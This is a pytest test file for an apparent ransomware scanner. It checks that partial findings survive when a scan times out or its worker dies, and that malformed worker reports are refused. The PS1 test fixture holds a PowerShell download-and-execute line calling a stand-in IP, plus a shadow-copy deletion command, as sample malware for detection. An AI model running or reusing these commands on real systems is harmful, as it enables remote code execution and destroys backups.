"""H6 option (b), owner-approved 2026-11-12: a file whose scan times out or kills
its worker keeps the findings the worker reported before the failure.

What reaches the parent before a failure (engine/workers.py): for the outer file
only, its container's own signal once the container is opened ("container") and
each direct member whose scan finished ("member"), both checked as M18 checks
every message. Nothing is reconstructed: the parent scores that evidence with
the scorer the container layer uses (its signal plus the worst finished member)
and keeps the higher of that and the failed-scan Medium (owner's choice).
scan_status stays "failed", scan_results.scan_failed and the H6 (a) notice stay,
and the evidence is listed in scan_results.partial_evidence."""

import glob
import json
import os
import zipfile

import pytest

import RansomwareScanner as RS
from core import outbox as OB
from core.outputs import deliver
from engine import workers as W
from tests.test_incomplete_scan_alert import receiver  # noqa: F401  (fixture)
from tests.test_scanner_integration import _config
from tests.test_workers import _setup

PS1 = (b"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')\n"
       b"vssadmin delete shadows /all /quiet\n")
ZIPS = {
    "listing.zip": [("invoice.pdf.exe", b"MZ" + bytes(62)), ("readme.txt", b"hi"),
                    ("hang.txt", b"x")],                       # review H6 check 2
    "member.zip": [("run.ps1", PS1), ("exit.txt", b"x")],      # a finished member, then death
    "nothing.zip": [("readme.txt", b"hi"), ("hang.txt", b"x")],
    "fine.zip": [("run.ps1", PS1), ("readme.txt", b"hi")],     # completes
}


def _zip(path, members):
    with zipfile.ZipFile(path, "w") as z:
        for name, data in members:
            z.writestr(name, data)


@pytest.fixture(scope="module")
def scanned(tmp_path_factory):
    """One isolated scan with the stand-in scanner (tests/worker_fakes.py): a
    member named hang* sleeps past the limit, exit* ends the worker."""
    tmp = tmp_path_factory.mktemp("h6b")
    s = _setup(tmp, [], scan_timeout_seconds=5, scan_workers=2)
    for name, members in ZIPS.items():
        _zip(tmp / "scan" / name, members)
    yield s, {r["file_name"]: r for r in s.scan_all_directories()}, tmp
    if getattr(s, "cache", None) is not None:      # a module fixture closes its own (I-T2)
        s.cache.close()


def _cfg(s, tmp, **over):
    return dict(s.config, webhook_url="https://siem.example.invalid/hook",
                outbox_dir=str(tmp / "outbox"), jsonl_path="", **over)


def test_a_timeout_keeps_the_container_findings(scanned):
    _, res, _ = scanned
    r = res["listing.zip"]
    assert (r["verdict"], r["risk_score"], r["scan_status"]) == ("Critical", 95, "failed")
    assert r["verdict_label"] == "Critical (failed scan)" and r["is_malicious"] is True
    assert "timed out after 5s" == r["scan_results"]["scan_failed"]["reason"]
    pe = r["scan_results"]["partial_evidence"]
    assert pe["containers"] == ["archive"] and pe["members_scanned"] == 2
    assert pe["indicators"] == ["archive_double_extension", "archive_executable"]
    reason = r["incomplete_reasons"][0]
    assert reason["status"] == "failed" and reason["reason"].startswith("timed out after 5s; ")
    assert "findings made before the failure are kept" in reason["reason"]


def test_a_dead_worker_keeps_a_finished_member(scanned):
    _, res, _ = scanned
    r = res["member.zip"]
    assert r["verdict"] == "Critical" and r["scan_status"] == "failed"
    assert "died" in r["scan_results"]["scan_failed"]["reason"]
    pe = r["scan_results"]["partial_evidence"]
    assert [m["name"].rsplit("!/", 1)[-1] for m in pe["members"]] == ["run.ps1"]
    assert pe["members"][0]["container"] == "archive" and pe["members"][0]["verdict"] == "Critical"
    assert "archive_member:script_behaviour" in pe["indicators"]
    indicators = [c["indicator"] for c in r["score_breakdown"]["contributions"]]
    assert "archive_member:script_behaviour" in indicators


def test_no_evidence_leaves_the_failed_result_as_before(scanned):
    s, res, tmp = scanned
    r = res["nothing.zip"]
    before = W.failure_result(s, r["file_path"], "timed out after 5s")
    assert "partial_evidence" not in r["scan_results"]
    for key in ("verdict", "risk_score", "scan_status", "incomplete_reasons", "scan_results",
                "score_breakdown", "verdict_label"):
        assert r[key] == before[key], key


def test_a_finished_scan_is_unchanged_by_the_reports(scanned, tmp_path):
    s, res, _ = scanned
    r = res["fine.zip"]
    assert r["scan_status"] != "failed" and "partial_evidence" not in r["scan_results"]
    plain = RS.RansomwareScanner(dict(s.config, isolate_scans=False, _scanner_factory=""))
    alone = plain.scan_file(r["file_path"])
    assert (r["verdict"], r["risk_score"]) == (alone["verdict"], alone["risk_score"])


def test_kept_evidence_raises_the_malware_alert_and_keeps_the_notice(scanned, receiver):
    s, res, tmp = scanned
    deliver([res["listing.zip"], res["nothing.zip"]], _cfg(s, tmp))   # default floor: High
    got = sorted((m["file_path"].rsplit("/", 1)[-1], m["kind"]) for m in receiver)
    assert got == [("listing.zip", "scan_failed"), ("listing.zip", "verdict"),
                   ("nothing.zip", "scan_failed")]
    verdict = next(m for m in receiver if m["kind"] == "verdict")
    assert verdict["verdict"] == "Critical"
    assert OB.failed_alert(res["listing.zip"])["email"]["reason_codes"] == ["scan_timed_out"]


def test_reports_show_the_failed_scan_and_its_evidence(scanned):
    s, res, _ = scanned
    text = s.generate_report([res["listing.zip"]])
    assert "Critical (failed scan)" in text
    assert "findings made before the failure are kept" in text
    newest = max(glob.glob(os.path.join(s.report_dir, "ransomware_scan_*.json")),
                 key=os.path.getmtime)
    with open(newest) as fh:
        saved = json.load(fh)[0]
    assert saved["scan_status"] == "failed"
    assert saved["scan_results"]["partial_evidence"]["indicators"][0] == "archive_double_extension"


def test_only_the_outer_files_container_and_direct_members_are_reported(tmp_path):
    """A ZIP inside a ZIP: the archive layer unpacks the nested ZIP itself, so its
    script is one of the outer archive's members. Only the outer file's container
    reports its listing; member reports come from that container alone."""
    s = RS.RansomwareScanner(_config(tmp_path, isolate_scans=False))
    inner = tmp_path / "inner.zip"
    _zip(inner, [("deep.ps1", PS1)])
    outer = tmp_path / "scan" / "outer.zip"
    _zip(outer, [("inner.zip", inner.read_bytes()), ("a.txt", b"hi")])
    events = []
    s.member_listener = lambda event, kind, data: events.append((event, kind, data))
    s.scan_file(str(outer))
    assert [(e, k) for e, k, _ in events] == [("container", "archive"), ("member", "archive"),
                                              ("member", "archive")]
    assert {os.path.basename(d["file_path"]) for e, _, d in events if e == "member"} == {
        "deep.ps1", "a.txt"}
    report = W.container_evidence("archive", events[0][2])
    W.check_reply(json.loads(json.dumps(["container", report])))


@pytest.mark.parametrize("payload,why", [
    ({"container": "zip", "signal": {}}, "not {container, signal}"),
    ({"container": "archive", "signal": {}, "x": 1}, "not {container, signal}"),
    ({"container": "archive", "signal": []}, "not {container, signal}"),
    ({"container": "archive", "signal": {"worst": {"name": "x"}}}, "not {container, signal}"),
    ({"container": "archive", "signal": {"pwn": True}}, "unknown fields"),
])
def test_malformed_container_reports_are_refused(payload, why):
    with pytest.raises(W.InvalidReply, match=why):
        W.check_reply(["container", payload])


def _member(**over):
    r = {"file_path": "a.zip!/m", "file_name": "m", "verdict": "High", "risk_score": 70,
         "scan_status": "complete", "scan_results": {},
         "score_breakdown": {"contributions": [{"indicator": "x", "category": "technical",
                                                "points": 70, "detail": ""}]}}
    r.update(over)
    return r


@pytest.mark.parametrize("payload,why", [
    ({"container": "archive", "result": _member(), "x": 1}, "not {container, result}"),
    ({"container": "tar", "result": _member()}, "not {container, result}"),
    ({"container": "archive", "result": _member(verdict="Evil")}, "unknown verdict"),
    ({"container": "archive", "result": _member(score_breakdown={"contributions": {}})},
     "not a list"),
    ({"container": "archive", "result": _member(score_breakdown={"contributions": [
        {"indicator": "x", "points": float("nan")}]})}, "not plain"),
    ({"container": "archive", "result": _member(score_breakdown={"contributions": [
        {"indicator": "x", "points": True}]})}, "not plain"),
    ({"container": "archive", "result": _member(score_breakdown={"contributions": [
        {"indicator": 5, "points": 1}]})}, "not plain"),
    ({"container": "archive", "result": _member(risk_score=float("inf"))}, "not finite"),
])
def test_malformed_member_reports_are_refused(payload, why):
    raw = json.dumps(["member", payload]).encode()          # NaN and Infinity as JSON allows
    with pytest.raises(W.InvalidReply, match=why):
        W.check_reply(json.loads(raw))


def test_a_signal_that_breaks_the_scorer_falls_back_to_the_failed_result(tmp_path, caplog):
    s = RS.RansomwareScanner(_config(tmp_path, isolate_scans=False))
    p = tmp_path / "scan" / "f.zip"
    _zip(p, [("a.txt", b"hi")])
    ev = W.Evidence()
    ev.add_container({"container": "archive", "signal": {"executable_members": 7}})
    r = W.failure_result(s, str(p), "timed out after 5s", evidence=ev)
    assert r["verdict"] == "Medium" and "partial_evidence" not in r["scan_results"]
    assert "could not be scored" in caplog.text


def test_evidence_keeps_the_highest_members_and_counts_all():
    ev = W.Evidence()
    for i in range(W.MAX_KEPT_MEMBERS + 5):
        ev.add({"container": "archive", "result": _member(risk_score=i, file_name=f"m{i}")})
    assert ev.seen == W.MAX_KEPT_MEMBERS + 5 and len(ev.kept) == W.MAX_KEPT_MEMBERS
    assert ev.findings()[0][1]["file_name"] == f"m{W.MAX_KEPT_MEMBERS + 4}"


def test_an_unscanned_file_ignores_evidence(tmp_path):
    s = RS.RansomwareScanner(_config(tmp_path, isolate_scans=False))
    ev = W.Evidence()
    ev.add({"container": "archive", "result": _member()})
    r = W.failure_result(s, str(tmp_path / "scan" / "x"), W.ISOLATION_TEXT,
                         W.ISOLATION_UNAVAILABLE, "unavailable", evidence=ev)
    assert r["verdict"] == "Clean" and "partial_evidence" not in r["scan_results"]
